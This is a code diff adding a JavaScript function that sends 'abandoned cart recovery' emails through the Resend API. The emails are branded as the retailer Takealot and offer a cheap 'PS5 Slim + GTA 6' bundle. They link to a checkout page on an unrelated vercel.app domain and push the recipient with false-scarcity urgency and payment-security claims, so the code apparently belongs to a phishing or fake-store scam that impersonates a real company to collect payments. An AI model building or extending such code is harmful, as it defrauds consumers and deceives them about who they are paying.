@@ -329,8 +329,103 @@ async function sendOrderConfirmation(order) {
   }
 }
 
+/**
+ * Sends abandoned cart recovery email via Resend
+ */
+async function sendAbandonedRecoveryEmail(lead) {
+  const email = (lead.customer_email || lead.email || '').trim();
+  if (!email || !email.includes('@')) {
+    return { skipped: true, reason: 'No valid recipient email' };
+  }
+
+  const orderId = lead.order_id || lead.orderId || ('TK-' + Date.now().toString(36).toUpperCase());
+  const customerName = lead.customer_name || 'Valued Customer';
+  const totalAmount = Number(lead.amount || lead.cart_total || 1999);
+  const checkoutUrl = lead.checkout_url || `https://ps5fim-s11m.vercel.app/order.html?recover=${encodeURIComponent(orderId)}`;
+
+  const subject = `Action Required: Complete your order #${orderId} (Sony PS5 Slim + GTA 6 Bundle)`;
+
+  const html = `<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Complete Your Order #${orderId}</title>
+</head>
+<body style="margin: 0; padding: 0; background-color: #f1f5f9; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; color: #1e293b;">
+  <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="padding: 24px 0;">
+    <tr>
+      <td align="center">
+        <table role="presentation" width="100%" border="0" cellspacing="0" cellpadding="0" style="max-width: 600px; background-color: #ffffff; border-radius: 12px; overflow: hidden; box-shadow: 0 4px 20px rgba(0,0,0,0.06); border: 1px solid #e2e8f0;">
+          <tr>
+            <td style="background-color: #0b79bf; padding: 20px 28px; text-align: left;">
+              <span style="font-size: 24px; font-weight: 800; color: #ffffff;">takealot<span style="color: #f59e0b;">.com</span></span>
+            </td>
+          </tr>
+          <tr>
+            <td style="padding: 28px;">
+              <h2 style="margin: 0 0 14px; font-size: 20px; color: #0f172a;">Your promotional order #${orderId} is reserved!</h2>
+              <p style="font-size: 14.5px; line-height: 1.6; color: #475569; margin: 0 0 18px;">
+                Hi <b>${customerName}</b>,<br>
+                We noticed you didn't finish your checkout for the <b>Sony PlayStation 5 Slim 500GB + GTA 6 Limited Bundle</b>.
+              </p>
+              <div style="background-color: #fef2f2; border-left: 4px solid #ef4444; padding: 14px 16px; border-radius: 6px; margin-bottom: 22px;">
+                <p style="margin: 0; font-size: 13.5px; color: #991b1b; line-height: 1.5;">
+                  ⚠️ <b>Limited Clearance Stock:</b> Because only 3 units are allocated at the promotional price of <b>${formatRand(totalAmount)}</b>, your reservation will expire shortly if payment is not completed.
+                </p>
+              </div>
+              <div style="text-align: center; margin: 26px 0;">
+                <a href="${checkoutUrl}" style="background-color: #178a3b; color: #ffffff; padding: 16px 32px; border-radius: 8px; font-weight: 800; font-size: 16px; text-decoration: none; display: inline-block; box-shadow: 0 4px 12px rgba(23, 138, 59, 0.3);">
+                  COMPLETE SECURE PAYMENT NOW →
+                </a>
+              </div>
+              <p style="font-size: 12.5px; color: #94a3b8; text-align: center; margin: 0 0 12px;">
+                Supports Capitec Pay, Visa, Mastercard & Instant EFT with 256-Bit SSL Protection.
+              </p>
+            </td>
+          </tr>
+          <tr>
+            <td style="padding: 20px 28px; background-color: #0f172a; color: #94a3b8; font-size: 11.5px; text-align: center;">
+              Takealot Online (RF) (Pty) Ltd - Cape Town, South Africa
+            </td>
+          </tr>
+        </table>
+      </td>
+    </tr>
+  </table>
+</body>
+</html>`;
+
+  const text = `Hi ${customerName},\n\nYour order #${orderId} for Sony PlayStation 5 Slim 500GB + GTA 6 (${formatRand(totalAmount)}) is waiting for payment.\n\nComplete your order here:\n${checkoutUrl}\n\nTakealot Online South Africa`;
+
+  try {
+    const res = await fetch('https://api.resend.com/emails', {
+      method: 'POST',
+      headers: {
+        Authorization: `Bearer ${RESEND_API_KEY.trim()}`,
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify({
+        from: DEFAULT_FROM,
+        to: [email],
+        subject: subject,
+        html: html,
+        text: text
+      })
+    });
+    const data = await res.json().catch(() => null);
+    if (res.ok && data && data.id) {
+      console.log(`[email-service] Recovery email sent for #${orderId} to: ${email}. ID: ${data.id}`);
+      return { success: true, messageId: data.id };
+    }
+  } catch (err) {
+    console.warn('[email-service] Recovery email error:', err.message);
+  }
+  return { success: false };
+}
+
 module.exports = {
   sendOrderConfirmation,
+  sendAbandonedRecoveryEmail,
   renderTakealotHtml,
   renderTakealotPlainText
 };
